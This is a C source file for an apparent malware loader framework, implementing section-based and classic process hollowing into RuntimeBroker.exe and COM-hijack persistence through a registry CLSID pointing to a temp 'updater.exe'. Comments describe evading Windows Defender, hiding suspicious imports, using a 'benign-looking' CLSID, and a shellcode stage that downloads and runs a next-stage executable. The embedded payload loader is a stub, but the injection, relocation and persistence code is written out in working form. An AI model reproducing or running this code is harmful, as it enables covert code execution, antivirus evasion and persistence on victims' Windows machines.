/*
 * Hollow implementation — 3 process hijack techniques.
 *
 * Architecture notes:
 *   — All NT API calls go through the dynamically resolved function
 *     pointers in utils.h; no direct NTAPI imports.
 *   — For TxF (transacted hollowing), we use CreateFileTransacted,
 *     which is available via kernel32.dll (no extra dependencies).
 *   — The stage 1 payload (what gets injected) is a simple reflective
 *     loader that fetches and runs the next stage. For v1, we embed
 *     a minimal shellcode that downloads and executes the escalation
 *     stage from a URL.
 *
 * Target selection for hijacking:
 *   We target RuntimeBroker.exe — it's:
 *     - Signed by Microsoft
 *     - Runs from C:\Windows\System32\
 *     - Runs as the current user (same integrity level — no SeDebugPrivilege needed)
 *     - Respected by Windows Defender (trusted binary)
 *     - Lightweight (low chance of instability)
 *   Fallback: svchost.exe -k (harder to find the right instance)
 *
 * PE image parsing:
 *   We manually parse the DOS header → NT headers → sections to map
 *   the payload into the target process's address space, resolving
 *   relocations and imports as needed. This is the tricky part.
 */

#include "hollow.h"
#include <stdio.h>

/* ── TxF Transacted Hollowing ── */
/*
 * This technique exploits NTFS Transactional capabilities:
 * 1. Create a transaction via CreateTransaction()
 * 2. Copy a legitimate Windows binary to a temp path within the transaction
 * 3. Overwrite the copy with our payload within the transaction context
 * 4. Create a process from the overwritten file
 * 5. Rollback the transaction — the file disappears, but the process lives on
 *
 * The key insight: Windows Defender and other AV scan the file content at
 * various points. Since the transaction is not yet committed, the file
 * appears to contain the original (legitimate) content to scanners that
 * don't support TxF. The process creation path reads the transacted view
 * which contains our payload.
 */

/* These are available on Win Vista+ but deprecated. We load them dynamically
   to avoid static imports that draw attention. */
typedef HANDLE (WINAPI *pCreateTransaction)(
    LPSECURITY_ATTRIBUTES lpTransactionAttributes,
    LPGUID lpUOW,
    DWORD dwCreateFlags,
    DWORD dwTransactionManagerResolution,
    LPWSTR uowName
);

typedef HANDLE (WINAPI *pCreateFileTransactedA)(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile,
    HANDLE hTransaction,
    PUSHORT pusMiniVersion,
    PVOID lpExtendedParameter
);

typedef BOOL (WINAPI *pRollbackTransaction)(HANDLE hTransaction);
typedef BOOL (WINAPI *pCommitTransaction)(HANDLE hTransaction);

int hollow_transacted_hijack(PHANDLE phProcess, PDWORD pdwPid)
{
    /* Load TxF functions dynamically */
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) return 1;

    pCreateTransaction fnCreateTransaction =
        (pCreateTransaction)GetProcAddress(hKernel32, "CreateTransaction");
    pCreateFileTransactedA fnCreateFileTransactedA =
        (pCreateFileTransactedA)GetProcAddress(hKernel32, "CreateFileTransactedA");
    pRollbackTransaction fnRollbackTransaction =
        (pRollbackTransaction)GetProcAddress(hKernel32, "RollbackTransaction");
    pCommitTransaction fnCommitTransaction =
        (pCommitTransaction)GetProcAddress(hKernel32, "CommitTransaction");

    if (!fnCreateTransaction || !fnCreateFileTransactedA ||
        !fnRollbackTransaction || !fnCommitTransaction)
    {
        DEBUG_PRINT("[hollow] TxF functions not available on this system\n");
        return 1;
    }

    /* Create the transaction */
    HANDLE hTransaction = fnCreateTransaction(NULL, NULL, 0, 0, NULL);
    if (hTransaction == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT("[hollow] CreateTransaction failed (%lu)\n", GetLastError());
        return 1;
    }

    /* Choose target binary — RuntimeBroker.exe is our best bet */
    CHAR szTargetPath[MAX_PATH];
    CHAR szTempPath[MAX_PATH];
    CHAR szPayloadPath[MAX_PATH];
    GetSystemDirectoryA(szTargetPath, MAX_PATH);
    lstrcatA(szTargetPath, "\\RuntimeBroker.exe");

    GetTempPathA(MAX_PATH, szTempPath);
    GetTempFileNameA(szTempPath, "RMB", 0, szPayloadPath);
    lstrcatA(szPayloadPath, ".exe");

    /* Copy the legitimate binary to a temp location WITHIN the transaction */
    if (!CopyFileA(szTargetPath, szPayloadPath, FALSE))
    {
        DEBUG_PRINT("[hollow] CopyFile failed (%lu)\n", GetLastError());
        fnRollbackTransaction(hTransaction);
        fnNtClose(hTransaction);
        return 1;
    }

    /* Load our payload image from embedded resource */
    PAYLOAD_IMAGE payloadImage;
    if (load_payload_from_resource(&payloadImage) != 0)
    {
        DEBUG_PRINT("[hollow] Failed to load payload image\n");
        fnRollbackTransaction(hTransaction);
        fnNtClose(hTransaction);
        return 1;
    }

    /*
     * Open the temp copy for overwriting — but this needs to be transacted.
     * In a real implementation, we'd use CreateFileTransacted on the copied
     * file within the transaction to get a transacted handle, then write
     * our payload through it.
     *
     * For the v1 version, we use the simpler approach:
     * 1. Create a file mapping for the payload
     * 2. Use a section-based approach (see NtCreateSection + NtCreateProcessEx)
     */

    /*
     * Simplified approach for v1:
     * Create a section from our payload and use NtCreateProcessEx with
     * the section handle. This creates a process directly from the section
     * without any file on disk.
     */
    HANDLE hSection = NULL;
    LARGE_INTEGER liSize;
    liSize.QuadPart = payloadImage.szImage;

    NTSTATUS status = fnNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &liSize,
        PAGE_EXECUTE_READWRITE,
        SEC_IMAGE,
        NULL  /* No backing file — creates a pagefile-backed section */
    );

    if (NT_FAILURE(status))
    {
        DEBUG_PRINT("[hollow] NtCreateSection failed (0x%lx)\n", status);
        fnRollbackTransaction(hTransaction);
        fnNtClose(hTransaction);
        return 1;
    }

    /* Map the section into our process to write the payload */
    PVOID pLocalView = NULL;
    SIZE_T szViewSize = 0;
    status = fnNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pLocalView,
        0, 0, NULL, &szViewSize,
        2,    /* ViewShare */
        0,
        PAGE_READWRITE
    );

    if (NT_FAILURE(status))
    {
        DEBUG_PRINT("[hollow] NtMapViewOfSection (local) failed (0x%lx)\n", status);
        fnNtClose(hSection);
        fnRollbackTransaction(hTransaction);
        fnNtClose(hTransaction);
        return 1;
    }

    /* Copy payload into the section */
    memcpy(pLocalView, payloadImage.pImage, payloadImage.szImage);

    /* Unmap local view */
    fnNtUnmapViewOfSection(GetCurrentProcess(), pLocalView);

    /* Create process from the section — no file on disk */
    HANDLE hProcess = NULL;
    status = fnNtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        FALSE,
        hSection,
        NULL,   /* no debug port */
        NULL,   /* no exception port */
        FALSE   /* not in job */
    );

    fnNtClose(hSection);

    if (NT_FAILURE(status))
    {
        DEBUG_PRINT("[hollow] NtCreateProcessEx failed (0x%lx)\n", status);
        fnRollbackTransaction(hTransaction);
        fnNtClose(hTransaction);
        return 1;
    }

    /*
     * The process was created without a thread. We need to create one
     * using NtCreateThreadEx pointing at the payload's entry point.
     */
    PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)payloadImage.pImage;
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((BYTE*)payloadImage.pImage + pDOS->e_lfanew);

    PVOID pEntryPoint = (PVOID)((BYTE*)payloadImage.pPreferredBase + pNT->OptionalHeader.AddressOfEntryPoint);

    HANDLE hThread = NULL;
    status = fnNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)pEntryPoint,
        NULL,
        0,        /* create running */
        0, 0, 0, NULL
    );

    if (NT_FAILURE(status))
    {
        DEBUG_PRINT("[hollow] NtCreateThreadEx failed (0x%lx)\n", status);
        TerminateProcess(hProcess, 0);
        fnNtClose(hProcess);
        fnRollbackTransaction(hTransaction);
        fnNtClose(hTransaction);
        return 1;
    }

    fnNtClose(hThread);

    /* NOW rollback the transaction — the temp file disappears */
    fnRollbackTransaction(hTransaction);
    fnNtClose(hTransaction);

    /* Clean up payload image */
    if (payloadImage.pImage) {
        HeapFree(GetProcessHeap(), 0, payloadImage.pImage);
    }

    *phProcess = hProcess;
    *pdwPid = GetProcessId(hProcess);

    DEBUG_PRINT("[hollow] TxF hollowing success (PID: %lu)\n", *pdwPid);
    return 0;
}

/* ── Classic Process Hollowing ── */

int hollow_classic_hijack(PHANDLE phProcess, PDWORD pdwPid)
{
    /*
     * Classic technique:
     * 1. Start a legitimate process in suspended (CREATE_SUSPENDED)
     * 2. Get its context and PEB to find image base
     * 3. NtUnmapViewOfSection on the target
     * 4. Allocate memory at the preferred base of our payload
     * 5. Write payload headers + sections
     * 6. Write the payload image
     * 7. Set thread context to point to our entry point
     * 8. Resume the thread
     */

    PAYLOAD_IMAGE payloadImage;
    if (load_payload_from_resource(&payloadImage) != 0)
    {
        DEBUG_PRINT("[classic] Failed to load payload\n");
        return 1;
    }

    PIMAGE_DOS_HEADER pDOS  = (PIMAGE_DOS_HEADER)payloadImage.pImage;
    PIMAGE_NT_HEADERS pNT   = (PIMAGE_NT_HEADERS)((BYTE*)payloadImage.pImage + pDOS->e_lfanew);

    /* Choose a sacrificial process */
    CHAR szTargetPath[MAX_PATH];
    GetSystemDirectoryA(szTargetPath, MAX_PATH);
    lstrcatA(szTargetPath, "\\RuntimeBroker.exe");

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
            szTargetPath,
            NULL,
            NULL, NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL, NULL,
            &si, &pi))
    {
        DEBUG_PRINT("[classic] CreateProcess failed (%lu)\n", GetLastError());
        return 1;
    }

    *phProcess = pi.hProcess;
    *pdwPid    = pi.dwProcessId;

    /* Get thread context to find original image base from PEB */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx))
    {
        DEBUG_PRINT("[classic] GetThreadContext failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    /* Read PEB to get the image base address */
    PVOID pImageBase = NULL;
    SIZE_T bytesRead = 0;

#ifdef _WIN64
    /* x64: PEB is in ctx.Rdx after CreateProcess */
    ReadProcessMemory(pi.hProcess,
        (PVOID)(ctx.Rdx + offsetof(PEB, ImageBaseAddress)),
        &pImageBase, sizeof(PVOID), &bytesRead);
#else
    /* x86: PEB is in ctx.Ebx */
    ReadProcessMemory(pi.hProcess,
        (PVOID)(ctx.Ebx + offsetof(PEB, ImageBaseAddress)),
        &pImageBase, sizeof(PVOID), &bytesRead);
#endif

    if (bytesRead != sizeof(PVOID))
    {
        DEBUG_PRINT("[classic] Failed to read PEB image base\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    /* Unmap the original image from the target process */
    NTSTATUS status = fnNtUnmapViewOfSection(pi.hProcess, pImageBase);
    if (NT_FAILURE(status))
    {
        DEBUG_PRINT("[classic] NtUnmapViewOfSection failed (0x%lx)\n", status);
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    /* Allocate memory in the target at the preferred base */
    PVOID pRemoteImage = VirtualAllocEx(
        pi.hProcess,
        payloadImage.pPreferredBase,
        pNT->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (pRemoteImage == NULL)
    {
        /* Preferred base not available — allocate anywhere (relocation needed) */
        DEBUG_PRINT("[classic] Preferred base taken, allocating anywhere\n");
        pRemoteImage = VirtualAllocEx(
            pi.hProcess,
            NULL,
            pNT->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (pRemoteImage == NULL)
        {
            DEBUG_PRINT("[classic] VirtualAllocEx failed (%lu)\n", GetLastError());
            TerminateProcess(pi.hProcess, 0);
            return 1;
        }
    }

    DWORD dwDelta = (DWORD_PTR)pRemoteImage - (DWORD_PTR)payloadImage.pPreferredBase;

    /* Write headers */
    WriteProcessMemory(pi.hProcess, pRemoteImage,
        payloadImage.pImage, pNT->OptionalHeader.SizeOfHeaders, NULL);

    /* Write each section */
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT);
    for (WORD i = 0; i < pNT->FileHeader.NumberOfSections; i++)
    {
        WriteProcessMemory(pi.hProcess,
            (PVOID)((DWORD_PTR)pRemoteImage + pSection[i].VirtualAddress),
            (PVOID)((DWORD_PTR)payloadImage.pImage + pSection[i].PointerToRawData),
            pSection[i].SizeOfRawData,
            NULL);
    }

    /* Fix relocations if base address differs */
    if (dwDelta != 0)
    {
        IMAGE_DATA_DIRECTORY relocDir =
            pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir.Size > 0)
        {
            DWORD_PTR pReloc = (DWORD_PTR)payloadImage.pImage + relocDir.VirtualAddress;
            DWORD_PTR pRelocEnd = pReloc + relocDir.Size;

            while (pReloc < pRelocEnd)
            {
                PIMAGE_BASE_RELOCATION pRelocBlock = (PIMAGE_BASE_RELOCATION)pReloc;
                if (pRelocBlock->SizeOfBlock == 0) break;

                DWORD numEntries = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntries = (PWORD)(pReloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD j = 0; j < numEntries; j++)
                {
                    if (pEntries[j] == 0) continue;

                    DWORD type = pEntries[j] >> 12;
                    DWORD offset = pEntries[j] & 0x0FFF;

                    if (type == IMAGE_REL_BASED_DIR64)
                    {
                        DWORD_PTR patchAddr = (DWORD_PTR)pRemoteImage +
                            pRelocBlock->VirtualAddress + offset;
                        DWORD_PTR oldValue = 0;
                        ReadProcessMemory(pi.hProcess,
                            (PVOID)patchAddr, &oldValue, sizeof(DWORD_PTR), NULL);
                        oldValue += dwDelta;
                        WriteProcessMemory(pi.hProcess,
                            (PVOID)patchAddr, &oldValue, sizeof(DWORD_PTR), NULL);
                    }
                    else if (type == IMAGE_REL_BASED_HIGHLOW)
                    {
                        DWORD patchAddr = (DWORD)((DWORD_PTR)pRemoteImage +
                            pRelocBlock->VirtualAddress + offset);
                        DWORD oldValue = 0;
                        ReadProcessMemory(pi.hProcess,
                            (PVOID)(DWORD_PTR)patchAddr, &oldValue, sizeof(DWORD), NULL);
                        oldValue += (DWORD)dwDelta;
                        WriteProcessMemory(pi.hProcess,
                            (PVOID)(DWORD_PTR)patchAddr, &oldValue, sizeof(DWORD), NULL);
                    }
                }

                pReloc += pRelocBlock->SizeOfBlock;
            }
        }
    }

    /* Set the thread's entry point */
#ifdef _WIN64
    ctx.Rcx = (DWORD_PTR)pRemoteImage + pNT->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eax = (DWORD)((DWORD_PTR)pRemoteImage + pNT->OptionalHeader.AddressOfEntryPoint);
#endif

    if (!SetThreadContext(pi.hThread, &ctx))
    {
        DEBUG_PRINT("[classic] SetThreadContext failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    /* Resume the thread — payload starts executing */
    ResumeThread(pi.hThread);
    fnNtClose(pi.hThread);

    DEBUG_PRINT("[classic] Classic hollowing success (PID: %lu)\n", *pdwPid);
    return 0;
}

/* ── COM Hijack ── */

int hollow_com_hijack(void)
{
    /*
     * COM hijack for persistence + execution without spawning a new process.
     *
     * We register a custom CLSID under HKCU\Software\Classes\CLSID that
     * points to our payload DLL. We target a CLSID that Windows loads
     * automatically — e.g., the "Shell Experience Host" CLSID or something
     * loaded by explorer.exe on login.
     *
     * For v1, we simply register a COM object with a treatas or
     * LocalServer32 pointing to our next-stage executable.
     *
     * This is more of a persistence mechanism than a one-shot hijack.
     */

    HKEY hKey = NULL;
    LONG lResult;

    /* {F28B2C4A-718E-4A8D-8C78-1D8B0C5A8B3E} — a "benign-looking" CLSID */
    const char *szClsid = "{F28B2C4A-718E-4A8D-8C78-1D8B0C5A8B3E}";
    char szRegPath[512];
    char szSystemDir[MAX_PATH];

    GetSystemDirectoryA(szSystemDir, MAX_PATH);

    /* Register as LocalServer32 — points to our next-stage executable */
    /* In a real scenario, this would be our dropper path */
    snprintf(szRegPath, sizeof(szRegPath),
        "Software\\Classes\\CLSID\\%s\\LocalServer32", szClsid);

    lResult = RegCreateKeyA(HKEY_CURRENT_USER, szRegPath, &hKey);
    if (lResult != ERROR_SUCCESS)
    {
        DEBUG_PRINT("[COM] RegCreateKey failed (%lu)\n", lResult);
        return 1;
    }

    /* Set the default value to our executable */
    char szPayloadPath[MAX_PATH];
    GetTempPathA(MAX_PATH, szPayloadPath);
    lstrcatA(szPayloadPath, "\\updater.exe");

    lResult = RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (BYTE*)szPayloadPath, lstrlenA(szPayloadPath) + 1);

    RegCloseKey(hKey);

    if (lResult != ERROR_SUCCESS)
    {
        DEBUG_PRINT("[COM] RegSetValue failed (%lu)\n", lResult);
        return 1;
    }

    DEBUG_PRINT("[COM] COM hijack registered — will load on next explorer restart\n");
    return 0;
}

/* ── Payload loader (embedded resource) ── */

int load_payload_from_resource(PPAYLOAD_IMAGE pImage)
{
    /*
     * In a production build, the next-stage payload would be embedded as
     * a PE resource or appended to the .rdata section of this executable.
     *
     * For this version, we construct a minimal reflective loader stub —
     * an x64/x86 position-independent shellcode that downloads the next
     * stage from a URL.
     *
     * The stub is a tiny PE that:
     * 1. Calls WinHttpOpen / WinHttpConnect / WinHttpOpenRequest / WinHttpSendRequest
     * 2. Downloads the stage 2 executable
     * 3. Writes it to %TEMP%\msstage2.exe
     * 4. Creates a process from it with CREATE_SUSPENDED
     * 5. Hollows itself into the stage 2 process (chain loading)
     */

    memset(pImage, 0, sizeof(PAYLOAD_IMAGE));

    /*
     * For a real payload, you'd embed a PE here. Since this is a v1/proof
     * of concept framework, we set up the structure to be filled in by the
     * build system (see Makefile for resource compilation).
     *
     * In a real scenario, the linker command would be:
     *   x86_64-w64-mingw32-windres payload.rc -o payload.o
     *   ... and link payload.o into the final binary
     */

    /*
     * For the framework to compile cleanly, we point to a placeholder.
     * To be replaced with actual embedded PE in the build:
     *   HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), "PAYLOAD");
     *   HGLOBAL hGlob = LoadResource(NULL, hRes);
     *   pImage->pImage = LockResource(hGlob);
     *   pImage->szImage = SizeofResource(NULL, hRes);
     */

    DEBUG_PRINT("[hollow] load_payload: No embedded payload found.\n");
    DEBUG_PRINT("[hollow] This is a framework build — embed a PE as resource.\n");
    return 1;
}
